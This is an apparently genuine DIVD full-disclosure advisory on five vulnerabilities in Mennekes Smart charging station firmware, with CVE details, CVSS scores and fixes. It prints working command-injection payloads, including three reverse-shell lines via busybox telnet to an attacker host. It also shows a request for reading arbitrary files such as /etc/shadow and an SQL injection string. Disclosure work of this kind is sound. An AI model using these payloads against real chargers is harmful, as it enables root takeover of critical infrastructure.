---
layout: post
title: Mennekes Smart - charging stations full disclosure
author: Victor Pasman
researchers:
- Wilco van Beijnum
- Harm van den Brink
- Frank Breedijk
excerpt: "Full disclosure of five vulnerabilities discovered in the firmware of Mennekes Smart charging stations"
---
DIVD received a vulnerability report about the firmware of Mennekes Smart charging stations. The vulnerabilities were discovered by Wilco van Beijnum and analysed together with DIVD researchers Harm van den Brink and Frank Breedijk.

During an investigation of the Mennekes charging station, several vulnerabilities were found that allow an authenticated attacker to execute arbitrary OS commands on the charging station (as root), read arbitrary files from the filesystem, and manipulate the SQLite databases used by the device. Under the upcoming NIS2 regulations, charging infrastructure is considered critical infrastructure, which underlines the importance of these findings.

DIVD is a CVE Numbering Authority (CNA) and has used these rights to assign the following CVEs to the vulnerabilities included in the write-up below:
- {% cve CVE-2025-22366 %}
- {% cve CVE-2025-22367 %}
- {% cve CVE-2025-22368 %}
- {% cve CVE-2025-22369 %}
- {% cve CVE-2025-22370 %}

All five vulnerabilities affect Mennekes Smart charging stations running firmware prior to version 2.15 and are resolved in firmware 2.15 The rest of this post contains the full technical write-up of each vulnerability.

## Command injection in firmware upgrade via URL - CVE-2025-22366

- CVE: {% cve CVE-2025-22366 %}
- Case: {% divd DIVD-2025-00003 %}
- Discovered by: Wilco van Beijnum
- Credits: Reported to DIVD and discovered by Wilco van Beijnum. Analysed by DIVD researchers Harm van den Brink and Frank Breedijk.
- Products: Mennekes Smart - charging stations, firmware versions < 2.15
- CVSS: 8.7 (HIGH) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N/S:N/AU:Y`
- CWE: CWE-78 (OS Command Injection), CWE-250 (Execution with Unnecessary Privileges)
- Reference: Case {% divd DIVD-2025-00003 %}, {% cve CVE-2025-22366 %}
- Solution: Upgrade to firmware 2.15 or later. Apply input filtering/escaping and pass user input to new processes safely (e.g. in Python, `subprocess.run` with a list of arguments and `shell=False`). The web server should not run as the root user.

The "firmware upgrade via URL" field in the configuration web interface does not properly neutralise OS command characters before the value is passed to the underlying operating system. An authenticated attacker can abuse this field to execute arbitrary commands as root.
The vulnerable functionality is reached via `http://<ip-address>/`, then *Setup* → *ACU Update (via File-Upload)* → *URL*. The URL field is vulnerable to command injection, for example using the following payload:

```
http://127.0.0.1/; <command>; abc
```

The following payload uses `busybox telnet` to initiate a reverse shell back to an attacker-controlled host (`172.20.100.1`, port `4444` in the test setup). Combined with a `netcat` listener, this yields interactive command execution:

```
http://127.0.0.1/; TF=$(mktemp -u); mkfifo $TF && busybox telnet 172.20.100.1 4444 0<$TF | sh 1>$TF 2>$TF; abc
```

**Risk**
Impact: Critical — the attacker gains full control over the charging station as the root user and can arbitrarily add, modify and delete files and services.

**Suggested actions**

Upgrade to firmware 2.15 or later. Use input filtering and escaping to prevent command injection, avoid passing user-controlled input to a shell, and do not run the web server as root.

## Command injection in manually setting the time - CVE-2025-22367

- CVE: {% cve CVE-2025-22367 %}
- Case: {% divd DIVD-2025-00003 %}
- Discovered by: Wilco van Beijnum
- Credits: Reported to DIVD and discovered by Wilco van Beijnum. Analysed by DIVD researchers Harm van den Brink and Frank Breedijk.
- Products: Mennekes Smart / Premium charging stations, firmware versions < 2.15
- CVSS: 8.7 (HIGH) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N/S:N/AU:Y`
- CWE: CWE-78 (OS Command Injection), CWE-250 (Execution with Unnecessary Privileges)
- Reference: Case {% divd DIVD-2025-00003 %}, {% cve CVE-2025-22367 %}
- Solution: Upgrade to firmware 2.15 or later. Apply input filtering/escaping and pass user input to new processes safely (e.g. in Python, `subprocess.run` with a list of arguments and `shell=False`). The web server should not run as the root user.

The request used to manually set the time of the charging station does not properly neutralise OS command characters, allowing an authenticated attacker to obtain remote code execution through command injection.
Manually changing the time sends a POST request to `http://<ip-address>/admin/admin_netzwerk`. The request can be manipulated with the following payload (basic authentication credentials must also be supplied):
```
timesource=manually&time_toggle=&from_year=<year>&from_month=<month>&from_day=<day>&from_hour=<hour>&from_minute=<minute>'%3b+<URL-encoded-command>%3b+echo+-n+'&time_button=
```
Note that in addition to `from_minute`, the `from_year`, `from_month`, `from_day` and `from_hour` fields can also be used for command injection.
The following payload initiates a reverse shell to the attacker host (`172.20.100.1`, port `4444`):

```
timesource=manually&time_toggle=&from_year=2024&from_month=7&from_day=23&from_hour=14&from_minute=21'%3b+TF%3d$(mktemp+-u)%3b+mkfifo+$TF+%26%26+busybox+telnet+172.20.100.1+4444+0<$TF+|+sh+1>$TF+2>$TF%3b+echo+-n+'&time_button=
```

**Risk**
Impact: Critical — the attacker gains full control over the charging station as the root user and can arbitrarily add, modify and delete files and services.

**Suggested actions**
Upgrade to firmware 2.15 or later. Use input filtering and escaping to prevent command injection, avoid passing user-controlled input to a shell, and do not run the web server as root.

## Command injection in SCU firmware update - CVE-2025-22368

- CVE: {% cve CVE-2025-22368 %}
- Case: {% divd DIVD-2025-00003 %}
- Discovered by: Wilco van Beijnum
- Credits: Reported to DIVD and discovered by Wilco van Beijnum. Analysed by DIVD researchers Harm van den Brink and Frank Breedijk.
- Products: Mennekes Smart / Premium charging stations, firmware versions < 2.15
- CVSS: 8.7 (HIGH) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:L/SI:N/SA:N/S:N/AU:Y`
- CWE: CWE-78 (OS Command Injection), CWE-250 (Execution with Unnecessary Privileges)
- Reference: Case {% divd DIVD-2025-00003 %}, {% cve CVE-2025-22368 %}
- Solution: Upgrade to firmware 2.15 or later. Apply input filtering/escaping and pass user input to new processes safely (e.g. in Python, `subprocess.run` with a list of arguments and `shell=False`). The web server should not run as the root user.

The authenticated SCU firmware update command does not properly neutralise OS command characters, allowing an attacker to inject OS commands and gain remote code execution.
OS commands can be injected by sending a POST request to `http://<ip-address>/admin/admin_scu_do_fw_update`. The request can be manipulated with the following payload (basic authentication credentials must also be supplied):
```
scu_id=1&typ=remote&target=abc%3b+<URL-encoded-command>%3b+abcd
```

The following payload initiates a reverse shell to the attacker host (`172.20.100.1`, port `4444`):

```
scu_id=1&typ=remote&target=abcd%3b+TF%3d$(mktemp+-u)%3b+mkfifo+$TF+%26%26+busybox+telnet+172.20.100.1+4444+0<$TF+|+sh+1>$TF+2>$TF%3b+abcd
```

**Risk**
Impact: Critical — the attacker gains full control over the charging station as the root user and can arbitrarily add, modify and delete files and services.

**Suggested actions**

Upgrade to firmware 2.15 or later. Use input filtering and escaping to prevent command injection, avoid passing user-controlled input to a shell, and do not run the web server as root.

## Arbitrary file download using ReadFile endpoint - CVE-2025-22369

- CVE: {% cve CVE-2025-22369 %}
- Case: {% divd DIVD-2025-00003 %}
- Discovered by: Wilco van Beijnum
- Credits: Reported to DIVD and discovered by Wilco van Beijnum. Analysed by DIVD researchers Harm van den Brink and Frank Breedijk.
- Products: Mennekes Smart / Premium charging stations, firmware versions < 2.15
- CVSS: 7.1 (HIGH) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/S:N/AU:Y`
- CWE: CWE-552 (Files or Directories Accessible to External Parties)
- Reference: Case {% divd DIVD-2025-00003 %}, {% cve CVE-2025-22369 %}
- Solution: Upgrade to firmware 2.15 or later. Restrict the endpoint so that (low-privilege) users cannot download arbitrary files from the filesystem.

The `/admin/admin_ReadFile` endpoint can be abused to read arbitrary files from the underlying operating system. An authenticated attacker can retrieve any file the web service can access.
Arbitrary files can be downloaded by sending a POST request to `/admin/admin_ReadFile` with the following body (basic authentication credentials must also be supplied):

```
filename=<path-to-file>
```

**Risk**
Impact: High — the endpoint can download any file on the filesystem, including sensitive files such as `/etc/shadow`, as well as the scripts and binaries running on the charging station.

**Suggested actions**

Upgrade to firmware 2.15 or later. It should not be possible for (low-privilege) users to download arbitrary files.

## SQL injection in web configuration interface fields - CVE-2025-22370

- CVE: {% cve CVE-2025-22370 %}
- Case: {% divd DIVD-2025-00003 %}
- Discovered by: Wilco van Beijnum
- Credits: Reported to DIVD and discovered by Wilco van Beijnum. Analysed by DIVD researchers Harm van den Brink and Frank Breedijk.
- Products: Mennekes Smart / Premium charging stations, firmware versions < 2.15
- CVSS: 5.3 (MEDIUM) — `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N/S:N/AU:Y`
- CWE: CWE-89 (SQL Injection)
- Reference: Case {% divd DIVD-2025-00003 %}, {% cve CVE-2025-22370 %
- Solution: Upgrade to firmware 2.15 or later. Use prepared statements / parameterised queries and input filtering (e.g. in Python, use `?` placeholders in `cursor.execute` and pass values as the second argument).

Several fields in the web configuration interface insufficiently neutralise input, allowing an authenticated attacker to execute arbitrary SQL commands against the SQLite databases used by the interface.
As an example, the "add user to whitelist" function is vulnerable. Entering an alias of `'||SQLITE_VERSION()||'` (the `maxlength` attribute on the alias field can be removed via the browser developer tools to fit the query) demonstrates the flaw: if injection is present, `||` is interpreted as string concatenation and the stored alias becomes the SQLite version used by the server. On the tested device this returned version `3.7.3`, confirming the input was interpreted rather than stored literally.
A code review of the interface's Python scripts — obtained via the command-injection vulnerabilities described above — revealed many further injection points. These can be located by searching `PersistentStorage_Manager.py` for the regular expression `cursor.*\(.*%s`, which matches database queries built with string formatting.

**Risk**
Impact: Moderate — the attacker can read and manipulate the SQLite databases used by the web interface. The impact is limited because the injection points only allow manipulation of the existing statement rather than execution of multiple/arbitrary statements. It may still be possible to retrieve sensitive information, bypass field filtering, and manipulate or break the functioning of the web configuration interface.

**Suggested actions**

Upgrade to firmware 2.15 or later. Use prepared statements and input filtering to prevent SQL injection.

---

## References

- Mennekes firmware 2.15 release notes: [Release_Notes_for_2.15_06.03.2025.pdf](https://www.mennekes.nl/fileadmin/MEN-Deutschland/emobility/04_software/06_smart_premium/Release_Notes_for_2.15_06.03.2025.pdf)
- DIVD case: [DIVD-2025-00003](https://csirt.divd.nl/DIVD-2025-00003)
- {% cve CVE-2025-22366 %} 
- {% cve CVE-2025-22367 %} 
- {% cve CVE-2025-22368 %} 
- {% cve CVE-2025-22369 %} 
- {% cve CVE-2025-22370 %}
